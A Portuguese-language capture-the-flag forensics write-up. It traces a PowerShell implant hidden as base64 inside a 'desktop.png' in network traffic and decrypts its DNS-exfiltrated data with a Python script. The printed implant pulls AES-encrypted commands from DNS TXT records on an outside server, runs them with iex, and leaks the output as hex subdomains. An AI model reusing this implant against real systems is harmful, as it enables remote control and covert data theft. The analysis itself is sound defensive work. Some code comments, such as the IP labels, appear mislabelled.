#Difficult : Easy #Category : Forensics
***
#### Info
Recebemos uma arquivo de tráfego de rede para concluir a investigação.
![[Pasted image 20250514192018.png]]
#### Basic Analysis
Sempre começo filtrando por `http` para ver as requisições feitas, pois é comum que se utilize a web na exploração, também costumo filtrar pelas requisições `GET`.
```
http.request.method == GET
```
![[Pasted image 20250514192418.png]]

Temos vários arquivos que foram enviados via `GET`, então seleciono cada um e sigo o `TCP Stream` para ver seu conteúdo. Como existem muitos arquivos repetidos, eu os pulo. Todos parecem ser binários reais menos o `desktop.png`.
![[Pasted image 20250514192834.png]]

Após seguir seu `TCP Stream` vejo que o real conteúdo da imagem é um `base64`. 
![[Pasted image 20250514192936.png]]

Podemos usar o `Cybercheff` para ver o conteúdo real.
![[Pasted image 20250514193104.png]]

Parece que temos um código em `PowershellScript`. Podemos copiar esse código para nossa máquina e analisa-lo. Esse é o código obtido.
```powershell
function Create - AesManagedObject($key, $IV) {
    $aesManaged = New - Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV)  {
        if ($IV.getType().Name  - eq "String")  {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        } else {
            $aesManaged.IV = $IV
        }

    }

    if ($key)  {
        if ($key.getType().Name  - eq "String")  {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        } else {
            $aesManaged.Key = $key
        }

    }

    $aesManaged
}

function Create - AesKey() {
    $aesManaged = Create - AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt - String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create - AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV  +  $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-", "")
}

function Decrypt - String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create - AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length  -  16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) {
    $t = $_;
    0..[math]::floor($t.length  /  $query) | % {
        $t.substring($query  *  $_, [math]::min($query, $t.length  -  $query  *  $_)) 
    }

}

$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve - DnsName  - type TXT  - DnsOnly windowsliveupdater.com  - Server 147.182.172.189|Select - Object  - Property Strings;
for ($num = 0;
$num  - le $out.Length - 2;
$num++) {
    $encryptedString = $out[$num].Strings[0]
    $backToPlainText = Decrypt - String $key $encryptedString
    $output = iex $backToPlainText;
    $pr = Encrypt - String $key $output|parts 32
    Resolve - DnsName  - type A  - DnsOnly start.windowsliveupdater.com  - Server 147.182.172.189
    for ($ans = 0;
    $ans  - lt $pr.length - 1;
    $ans++) {
        $domain =  - join($pr[$ans], ".windowsliveupdater.com")
        Resolve - DnsName  - type A  - DnsOnly $domain  - Server 147.182.172.189
    }

    Resolve - DnsName  - type A  - DnsOnly end.windowsliveupdater.com  - Server 147.182.172.189
}
```
#### Code analysis
Joguei esse código em um arquivo `powershell.code.ps1`.

Aqui parece que os dados são extraditados como requisições `DNS` com o dados em `HEX` concatenado com *.windowsliveupdater.com*.
![[Pasted image 20250515114319.png]]

Aqui ele faz requisições `DNS` e armazena as `strings` do campo `TXT` da requisição. Podemos voltar ao tráfego e analisar.
![[Pasted image 20250514195150.png]]

```
dns and ip.addr == 147.182.172.189
```
![[Pasted image 20250514201108.png]]
A primeira requisição `DNS` tem 7 entradas `TXT` em `base64`, aparentemente são os dados roubados.

Salvei elas em um arquivo `data.enc.`
```sh
nvim data.enc
```
![[Pasted image 20250514201303.png]]
Agora temos que descriptografar.

Após armazenar as `Strings` em um array ele passa elas para a função `Decrypt - String`.
![[Pasted image 20250514201728.png]]
Essa função faz um decode do `base64` recuperando os bytes, pega os primeiros 16 bytes e usa como `IV`, então faz a descriptografia dos últimos 16 bytes. A `key` da descriptografia é fornecida no `script` Powershell.
#### Flag
Sendo assim, consegui formar o seguinte script. Podemos então executa-lo.
![[Pasted image 20250515112946.png]]

```sh
python exploit.py
```
![[Pasted image 20250515113100.png]]

Temos a senha do usuário encodado em `base64`, vamos recupera-lo.
![[Pasted image 20250515113229.png]]
Achei que teria acabado, mas conseguimos apenas a primeira parte da flag.

Acredito que a segunda parte deve estar nas outras requisições feitas para roubar dados. Usei a seguinte pesquisa no `Wireshark`.
```
dns.qry.name contains ".windowsliveupdater.com" and ip.src == 10.0.2.15
```
![[Pasted image 20250515115002.png]]

Podemos recuperar esse dados com `Python` ou usando o `Tshark`. Vou fazer usando `Python` e já aproveitar o `script` de descriptografia.

Esse `script` pega o arquivo `PCAP` filtra as requisições `DNS`, separa o domínio principal, e recupera os dados extraditados em `HEX`. Após isso ele irá passar os bytes para a função de descriptografia.
```python
from Crypto.Cipher import AES
from scapy.all import *
import binascii
import base64

def aes_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
    aes = AES.new(key, AES.MODE_CBC, iv)  # Correção: MODE_CBC (não NODE_CBC)
    return aes.decrypt(ct)

def main() -> None:
    filename = "capture.pcap"
    src = "10.0.2.15"  # IP do atacante
    dst = "147.182.172.189"  # Servidor DNS malicioso

    output = ''
    flag = ''

    # Chave AES em base64 (corrigida do PDF)
    key = base64.b64decode("a1E4MUtycWswTmtrMHdqdg==")  

    # Lê o arquivo PCAP
    packets = rdpcap(filename)

    for pkt in packets:
        try:
            if pkt.haslayer(DNSQR) and pkt[IP].src == dst:  # Filtra respostas DNS do servidor malicioso
                # Extrai a parte relevante do domínio (ex: "start", "end", ou dados criptografados)
                data = pkt[DNSQR].qname.decode().split('.')[0]

                if data == 'start':
                    output = ''  # Inicia novo bloco
                elif data == 'end':
                    # Converte hex para bytes e descriptografa
                    decrypted_data = binascii.unhexlify(output)
                    iv = decrypted_data[:16]  # IV = primeiros 16 bytes
                    ct = decrypted_data[16:]   # Dados criptografados
                    res = aes_decrypt(key, iv, ct)
                    # Remove padding e exibe
                    print(res.strip(b'\x00').decode())
                    output = ''
                else:
                    output += data  # Concatena partes do payload

        except Exception as e:
            pass  # Ignora erros

if __name__ == '__main__':
    main()


```
![[Pasted image 20250515162418.png]]

***
![[Pasted image 20250515144354.png]]